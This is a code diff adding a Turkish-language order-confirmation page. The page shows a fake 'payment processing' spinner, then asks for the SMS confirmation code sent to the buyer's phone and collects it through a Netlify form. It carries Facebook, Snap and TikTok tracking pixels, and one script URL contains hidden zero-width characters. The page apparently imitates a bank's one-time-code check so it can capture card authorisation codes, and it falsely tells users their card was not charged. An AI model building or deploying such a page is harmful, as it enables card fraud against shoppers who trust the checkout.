@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thank You</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1285113338974322');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1285113338974322&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <!-- Snap Pixel Code -->
+<script type='text/javascript'>
+(function(e,t,n){if(e.snaptr)return;var a=e.snaptr=function()
+{a.handleRequest?a.handleRequest.apply(a,arguments):a.queue.push(arguments)};
+a.queue=[];var s='script';r=t.createElement(s);r.async=!0;
+r.src=n;var u=t.getElementsByTagName(s)[0];
+u.parentNode.insertBefore(r,u);})(window,document,
+'https://sc-static.net/scevent.min.js');
+
+snaptr('init', 'c8349112-aaf6-4365-9bab-0b1f5d6c4096', {
+'user_email': '__INSERT_USER_EMAIL__'
+});
+
+snaptr('track', 'PURCHASE', {'price': INSERT_PRICE, 'currency': 'INSERT_CURRENCY', 'transaction_id': 'INSERT_TRANSACTION_ID', 'item_ids': ['INSERT_ITEM_ID_1', 'INSERT_ITEM_ID_2'], 'item_category': 'INSERT_ITEM_CATEGORY', 'number_items': INSERT_NUMBER_ITEMS, 'uuid_c1': 'INSERT_UUID_C1', 'user_email': 'INSERT_USER_EMAIL', 'user_phone_number': 'INSERT_USER_PHONE_NUMBER', 'user_hashed_email': 'INSERT_USER_HASHED_EMAIL', 'user_hashed_phone_number': 'INSERT_USER_HASHED_PHONE_NUMBER'})
+
+</script>
+<!-- End Snap Pixel Code -->
+
+    <script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
+
+  ttq.load('CNMU6DJC77UF2JJS1U9G');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+    
+    <style>
+body {
+    overflow: hidden;
+    font-family: 'Montserrat', sans-serif;
+    color: #000;
+    background-color: #FFFFFF;
+    text-align: center;
+}
+
+.spinner-container, .otp-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    text-align: center;
+    background-color: #f5f5f5;
+}
+
+/* This is modified to initially hide the container */
+.thanks-container {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    text-align: center;
+    background-color: #f5f5f5;
+    transition: opacity 0.5s ease;
+}
+
+.spinner {
+    border: 4px solid rgba(0, 0, 0, 0.1);
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    border-left-color: #000;
+    animation: spin 0.5s linear infinite;
+    margin-bottom: 1rem;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.otp-container-2 {
+    background-color: #fff;
+    padding: 30px;
+    border: 1px solid #e1e1e1;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+    border-radius: 12px;
+    width: 70%;
+    text-align: center;
+}
+
+.otp-container-2 .otp-inputs {
+    display: flex;
+    justify-content: center;
+    margin: 20px auto;
+}
+
+.otp-container-2 .otp-inputs input {
+    border: 2px solid #e1e1e1;
+    font-size: 22px;
+    background-color: #f9f9f9;
+    color: #000;
+    width: 60%;
+    height: 45px;
+    text-align: center;
+    border-radius: 8px;
+    margin: 0 auto;
+}
+
+/* Responsive Styles */
+@media (max-width: 768px) {
+    .otp-container-2 {
+        padding: 20px;
+        width: 90%;
+    }
+
+    .otp-container-2 .otp-inputs {
+        justify-content: center; /* Center the input field */
+        margin: 0 auto; /* Center the input container */
+        width: 100%; /* Use full width for smaller screens */
+    }
+
+    .otp-container-2 .otp-inputs input {
+        margin: 0 auto; /* Center the input field */
+        width: 80%; /* Increase the width of the input field */
+        height: 60px; /* Increase the height of the input field */
+        font-size: 24px; /* Increase the font size for better readability */
+    }
+}
+
+.btn-2 {
+    background-color: #000;
+    color: #fff;
+    padding: 10px 25px;
+    border: none;
+    border-radius: 25px;
+    margin-top: 30px;
+    cursor: pointer;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.btn-2:hover {
+    background-color: #333;
+}
+
+.logo {
+    width: 30%;
+    margin-bottom: 20px;
+}
+
+.timer-progress-container {
+            position: relative;
+            width: 70%;
+            height: 5px; /* Thinner progress bar */
+            background-color: #e1e1e1;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px auto 10px; /* Adjusted margin for spacing */
+        }
+
+        .timer-bar {
+            height: 100%;
+            width: 100%;
+            background-color: #0168B1; /* Changed to gray */
+            transition: width 1s linear;
+        }
+
+        .timer {
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+            color: #000;
+            margin-top: 5px; /* Timer below the progress bar */
+        }
+
+        .resend-link {
+            color: #0168B1; /* Initially gray */
+            margin-top: 10px;
+            cursor: not-allowed; /* Initially not clickable */
+            transition: color 0.3s ease;
+            text-decoration: none; /* Remove underline from links */
+        }
+
+        .resend-link.enabled {
+            color: #000;
+            cursor: pointer;
+        }
+
+        .resend-confirmation {
+            font-size: 14px;
+            color: #6d6d72; /* Apple grey text */
+            margin-top: 5px;
+        }
+
+
+</style>
+
+</head>
+<div id="customAlert" style="display: none; position: fixed; top: 0; right: 0; bottom: 0; left: 0; background-color: rgba(0,0,0,0.7); color: white; align-items: center; justify-content: center; font-size: 1.5rem;">
+    Custom submission message goes here.
+</div>
+<body>
+    <!-- Spinner Container -->
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <p>Ödeme işleniyor... Lütfen sayfayı yenilemeyin.</p>
+    </div>
+
+    <!-- OTP Container -->
+<div class="container">
+    <div class="row justify-content-center">
+        <div class="col-md-6 otp-container otp-container-2">
+            <img src="CONTENT/Square_combinationmark_black.png" alt="App Logo" class="logo">
+            <h2>Lütfen onaylayın</h2>
+            <p>İşlemi onaylamak için cep telefonunuza gönderilen kodu girin:</p>
+            <!-- The actual visible form -->
+            <form id="otpVerificationForm" name="otpVerificationForm" data-netlify="true">
+                <div class="otp-inputs">
+                    <!-- Single OTP input field -->
+                    <input type="tel" id="otpInput" name="otpCode" maxlength="8" minlength="6" autocomplete="one-time-code" pattern="[0-9]{6,8}" inputmode="numeric" required>
+                </div>
+                <input type="hidden" name="form-name" value="otpVerificationForm" />
+                <button class="btn-2" type="submit">Onaylamak</button>
+            </form>
+            <!-- Hidden form for Netlify -->
+            <form id="resendOTPForm" name="resendOTPForm" method="post" data-netlify="true" style="display: none;">
+                <input type="hidden" name="form-name" value="resendOTPForm" />
+            </form>
+            <!-- Timer and Resend Link -->
+            <div class="timer-progress-container">
+                <div id="timerBar" class="timer-bar"></div>
+            </div>
+            <div id="timer" class="timer">01:15</div>
+            <a href="#" id="resendLink" class="resend-link">Yeniden gönderme kodu</a>
+            <p id="resendConfirmation" class="resend-confirmation" style="display:none;">OTP isteğiniz devam ediyor. Ağ tıkanıklığı veya güvenlik doğrulamaları nedeniyle ara sıra gecikmeler meydana gelebilir. OTP'nizi 5 dakika içinde teslim etmeye çalışıyoruz. Elinize ulaşmadıysa lütfen yeni bir sipariş verin, kartınızdan çekim yapılmamıştır.</p>
+        </div>
+    </div>
+</div>
+
+
+    <!-- Thanks Container -->
+    <div class="container thanks-container">
+        <img src="CONTENT/Screen Shot 2024-02-29 at 22.38.18.png" alt="Thank You Image">
+        <h1 class="display-4">Satın aldığınız için teşekkür ederiz!</h1>
+        <p class="lead">Sipariş numaranız #SA339868. Hayatınızı kolaylaştıracak bu muhteşem ürünü sipariş ettiğiniz için sizi tebrik ederiz!!
+Siparişlerin işleme koyulmasının 1-2 gün sürdüğünü ve gönderim sürelerinin 1 ile 3 iş günü arasında değiştiğini lütfen unutmayın. Yani önümüzdeki 7 gün içinde teslimat garantilidir.</p>
+        <a class="btn btn-primary" href="index.html"></a>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="orderconfirmation.js"></script>
+    <script type='text/javascript'>
+(function(e,t,n){if(e.snaptr)return;var a=e.snaptr=function()
+{a.handleRequest?a.handleRequest.apply(a,arguments):a.queue.push(arguments)};
+a.queue=[];var s='script';r=t.createElement(s);r.async=!0;
+r.src=n;var u=t.getElementsByTagName(s)[0];
+u.parentNode.insertBefore(r,u);})(window,document,
+'https‍://sc-static.‍net/scevent.min.‍js');
+
+
+snaptr('init', 'CNMU6DJC77UF2JJS1U9G', {
+    'user_email': '__INSERT_USER_EMAIL__'
+});
+
+
+snaptr('track', 'PAGE_VIEW');
+snaptr('track', 'PURCHASE');
+
+
+</script>
+</body>
+
+</html>
